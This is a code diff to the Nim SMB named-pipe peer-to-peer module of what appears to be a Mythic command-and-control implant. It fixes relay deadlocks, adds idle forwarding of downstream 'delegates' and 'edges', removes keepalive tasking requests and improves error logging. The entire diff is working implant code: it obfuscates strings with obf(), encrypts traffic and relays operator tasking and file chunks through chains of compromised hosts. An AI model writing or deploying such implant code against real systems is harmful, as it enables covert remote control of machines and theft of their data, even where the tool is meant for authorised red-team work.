@@ -176,8 +176,10 @@ proc sendChunkedMessage(pipeHandle: HANDLE, message: string): bool =
         debug "[DEBUG] SMB P2P: Failed to write chunk data, error: ", GetLastError()
         return false
   
-  # Flush to ensure all data is sent
-  discard FlushFileBuffers(pipeHandle)
+  # Note: FlushFileBuffers intentionally NOT called here.
+  # On named pipes, FlushFileBuffers blocks until the remote end reads ALL data,
+  # which deadlocks the single-threaded SMB child on large messages (50+ chunks).
+  # WriteFile on a synchronous pipe already writes to the kernel buffer.
   debug "[DEBUG] SMB P2P: Message sent successfully"
   return true
 
@@ -510,8 +512,28 @@ proc start*(profile: SmbProfile) =
             break
           
           if bytesAvail == 0:
-            # No data available, sleep briefly
-            sleep(100)
+            # No data from parent - proactively check downstream P2P connections
+            # This is critical for multi-level P2P chains (e.g., HTTP <- SMB <- TCP)
+            # Without this, downstream responses get stuck in outChannels because
+            # we only drain them when processing a message from the parent
+            let (idleDelegates, idleEdges) = collectDownstreamDelegatesSmb(profile.callbackUuid)
+            if idleDelegates.len > 0 or idleEdges.len > 0:
+              debug "[DEBUG] SMB P2P: Proactively sending downstream data during idle (", idleDelegates.len, " delegates, ", idleEdges.len, " edges)"
+              let delegateResponse = %* {
+                obf("action"): obf("post_response"),
+                obf("responses"): []
+              }
+              if idleDelegates.len > 0:
+                delegateResponse[obf("delegates")] = idleDelegates
+              if idleEdges.len > 0:
+                delegateResponse[obf("edges")] = idleEdges
+              let responseEncrypted = profile.encryptMessage($delegateResponse, profile.callbackUuid)
+              discard sendChunkedMessage(profile.pipeHandle, responseEncrypted)
+            else:
+              # P2P agents are passive - they never send get_tasking.
+              # The egress (HTTP) agent drives communication by pushing data down.
+              # We just wait for the parent to send us something.
+              sleep(100)
             continue
           
           # Data available, read it
@@ -541,6 +563,9 @@ proc start*(profile: SmbProfile) =
               var chunksToSend = newJArray()
               
               for resp in responses:
+                if not resp.hasKey(obf("task_id")):
+                  debug "[DEBUG] SMB P2P: Skipping response without task_id"
+                  continue
                 let taskId = resp[obf("task_id")].getStr()
                 
                 # Handle chunk_data (Mythic sending file chunks for upload-type tasks)
@@ -736,15 +761,9 @@ proc start*(profile: SmbProfile) =
                   debug "[DEBUG] SMB P2P: Sending ", noChunkEdges.len, " downstream edge(s) (no chunks)"
                 let responseEncrypted = profile.encryptMessage($delegateResponse, profile.callbackUuid)
                 discard sendChunkedMessage(profile.pipeHandle, responseEncrypted)
-              else:
-                # Always respond to keep the relay chain alive (multi-level P2P)
-                let getTaskingMsg = %* {
-                  obf("action"): obf("get_tasking"),
-                  obf("tasking_size"): -1
-                }
-                debug "[DEBUG] SMB P2P: Sending get_tasking keepalive (no chunks, no downstream data)"
-                let responseEncrypted = profile.encryptMessage($getTaskingMsg, profile.callbackUuid)
-                discard sendChunkedMessage(profile.pipeHandle, responseEncrypted)
+              # else: Do NOT send a response for empty post_response with no downstream data.
+              # P2P agents are passive responders - they never initiate get_tasking.
+              # The egress agent drives communication by pushing data down.
               continue
             
             # Check for action field
@@ -777,6 +796,16 @@ proc start*(profile: SmbProfile) =
                       # Handle background_task
                       if command == obf("background_task"):
                         debug "[DEBUG] SMB P2P: Processing background_task for ", taskId
+                        
+                        # Parse parameters
+                        var bgParams = newJObject()
+                        if task.hasKey(obf("parameters")):
+                          let paramStr = task[obf("parameters")].getStr()
+                          if paramStr.len > 0:
+                            try:
+                              bgParams = parseJson(paramStr)
+                            except:
+                              debug "[DEBUG] Failed to parse background_task parameters"
                         
                         if backgroundTasks.hasKey(taskId):
                           var state = backgroundTasks[taskId]
@@ -933,7 +962,7 @@ proc start*(profile: SmbProfile) =
                     break
                 else:
                   debug "[DEBUG] SMB P2P: No tasks in get_tasking response"
-                  # Even without tasks, check for downstream delegate data to relay
+                  # Check for downstream delegate data to relay
                   let (noTaskDelegates, noTaskEdges) = collectDownstreamDelegatesSmb(profile.callbackUuid)
                   if noTaskDelegates.len > 0 or noTaskEdges.len > 0:
                     let delegateResponse = %* {
@@ -948,18 +977,12 @@ proc start*(profile: SmbProfile) =
                       debug "[DEBUG] SMB P2P: Sending ", noTaskEdges.len, " downstream edge(s) (no tasks)"
                     let responseEncrypted = profile.encryptMessage($delegateResponse, profile.callbackUuid)
                     discard sendChunkedMessage(profile.pipeHandle, responseEncrypted)
-                  else:
-                    # Always respond to keep the relay chain alive (multi-level P2P)
-                    let getTaskingMsg = %* {
-                      obf("action"): obf("get_tasking"),
-                      obf("tasking_size"): -1
-                    }
-                    debug "[DEBUG] SMB P2P: Sending get_tasking keepalive (no tasks, no downstream data)"
-                    let responseEncrypted = profile.encryptMessage($getTaskingMsg, profile.callbackUuid)
-                    discard sendChunkedMessage(profile.pipeHandle, responseEncrypted)
+                  # else: Do NOT send a response for empty get_tasking.
+                  # P2P agents are passive - they never send get_tasking.
+                  # The egress agent pushes data down and forwards responses back.
                   continue
-          except:
-            discard
+          except Exception as e:
+            debug "[DEBUG] SMB P2P: Error processing message: ", e.msg
           
         except Exception as e:
           debug "[DEBUG] SMB P2P: Error in client loop: ", e.msg
